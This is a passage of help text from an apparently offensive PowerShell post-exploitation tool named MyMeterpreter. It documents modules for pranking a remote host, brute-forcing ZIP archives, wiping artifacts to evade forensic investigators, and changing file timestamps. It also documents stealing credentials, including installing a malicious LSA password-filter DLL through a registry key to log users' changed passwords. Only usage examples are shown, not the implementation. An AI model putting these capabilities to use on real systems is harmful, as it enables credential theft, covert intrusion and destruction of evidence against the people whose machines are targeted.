      Helper - Speak Prank {SpeechSynthesizer}

   .DESCRIPTION
      Make remote host speak user input sentence (prank)

   .NOTES
      Required Dependencies: SpeechSynthesizer {native}
      Remark: Double Quotes are Mandatory in @arg declarations
      Remark: -Volume controls the speach volume {default: 88}
      Remark: -Rate Parameter configs the SpeechSynthesizer speed

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -SpeakPrank "Hello World"
      Make remote host speak "Hello World" {-Rate 1 -Volume 88}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100

   .OUTPUTS
      RemoteHost SpeachSpeed Volume Speak        
      ---------- ----------- ------ -----        
      SKYNET     5           100    'hello world'
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "MsgBox" -or $Help -ieq "TimeOut" -or $Help -ieq "ButtonType"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Spawn a msgBox on local host {ComObject}

   .NOTES
      Required Dependencies: Wscript ComObject {native}
      Remark: Double Quotes are Mandatory in -MsgBox value
      Remark: -TimeOut 0 parameter maintains the msgbox open.

      MsgBox Button Types
      -------------------
      0 - Show OK button. 
      1 - Show OK and Cancel buttons. 
      2 - Show Abort, Retry, and Ignore buttons. 
      3 - Show Yes, No, and Cancel buttons. 
      4 - Show Yes and No buttons. 
      5 - Show Retry and Cancel buttons. 

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -MsgBox "Hello World."

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -MsgBox "Hello World." -TimeOut 4
      Spawn message box and close msgbox after 4 seconds time {-TimeOut 4}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -MsgBox "Hello World." -ButtonType 4
      Spawns message box with Yes and No buttons {-ButtonType 4}

   .OUTPUTS
      TimeOut  ButtonType           Message
      -------  ----------           -------
      5 (sec)  'Yes and No buttons' 'Hello World.'
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "BruteZip" -or $Help -ieq "PassList"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Brute force ZIP archives {7z.exe}

   .DESCRIPTION
      This module brute forces ZIP archives with the help of 7z.exe
      It also downloads custom password list from @josh-newton GitHub
      Or accepts User dicionary if stored in `$Env:TMP\passwords.txt

   .NOTES
      Author: @securethelogs|@r00t-3xp10it
      Required Dependencies: 7z.exe {manual-install}
      Required Dependencies: `$Env:TMP\passwords.txt {auto|manual}
      Remark: Use double quotes if path contains any empty spaces.

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Desktop\MyMeterpreter.zip
      Brute forces the zip archive defined by -BruteZip parameter with 7z.exe bin.

   .OUTPUTS
      16:32:55 - Brute force Zip archives
      -----------------------------------
      Zip Archive  : MyMeterpreter.zip
      Archive Size : 7429,9765625/KB
      Password     : King!123
      -----------------------------------
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "CleanTracks"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Clean artifacts {temp,logs,scripts}

   .DESCRIPTION
      Module to clean artifacts that migth lead
      forensic investigatores to attacker tracks.

   .NOTES
      Required Dependencies: cmd|regedit {native}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -CleanTracks Clear
      Basic cleanning {flushdns,Prefetch,Recent,tmp *log|*bat|*vbs}

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -CleanTracks Paranoid
      Remark: Paranoid @arg deletes @MyMeterpreter auxiliary scripts

   .OUTPUTS
      Function    Date     DataBaseEntrys ModifiedRegKeys ScriptsCleaned
      --------    ----     -------------- --------------- --------------
      CleanTracks 22:17:29 20             3               2
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "GetPasswords" -or $Help -ieq "StartDir"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Author: @mubix|@r00t-3xp10it
      Helper - Search for creds in diferent locations {store|regedit|disk}
      Helper - Stealing passwords every time they change {mitre T1174}

   .DESCRIPTION
      -GetPasswords Enum searchs creds in disk\regedit diferent locations.
      -GetPasswords Dump Explores a native OS notification of when the user
      account password gets changed which is responsible for validating it.
      That means that the user password can be intercepted and logged.

   .NOTES
      -GetPasswords Dump requires Administrator privileges to add reg keys
      And the manual deletion of `$Env:WINDIR\System32\0evilpwfilter.dll from
      target disk at the end and also the deletion of the follow registry key:
      REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetPasswords Enum
      Dumps passwords from disk\regedit diferent locations

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetPasswords Enum -StartDir `$Env:USERPROFILE
      Searches for credentials recursive in text files starting in -StartDir

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -GetPasswords Dump
      Intercepts user changed passwords {logon}

   .OUTPUTS
      Time     Status  ReportFile           VulnDLLPath
      ----     ------  ----------           -----------
      17:49:23 active  C:\Temp\logFile.txt  C:\Windows\System32\0evilpwfilter.dll
   #>!bye..

"@;
Write-Host "$HelpParameters"
}ElseIf($Help -ieq "FileMace" -or $Help -ieq "Date"){
$HelpParameters = @"

   <#!Help.
   .SYNOPSIS
      Helper - Change file mace time {timestamp}

   .DESCRIPTION
      This module changes the follow mace propertys:
      CreationTime, LastAccessTime, LastWriteTime

   .NOTES
      -Date parameter format: "08 March 1999 19:19:19"
      Remark: Double quotes are mandatory in -Date param

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -FileMace `$Env:TMP\test.txt
      Changes sellected file mace using MyMeterprter default -Date "data-format"

   .EXAMPLE
      PS C:\> powershell -File MyMeterpreter.ps1 -FileMace `$Env:TMP\test.txt -Date "08 March 1999 19:19:19"
      Changes sellected file mace using user inputed -Date "data-format"

   .OUTPUTS
      FullName                        Exists CreationTime       
      --------                        ------ ------------       
      C:\Users\pedro\Desktop\test.txt   True 08/03/1999 19:19:19
   #>!bye..

"@;
Write-Host "$HelpParameters"
}

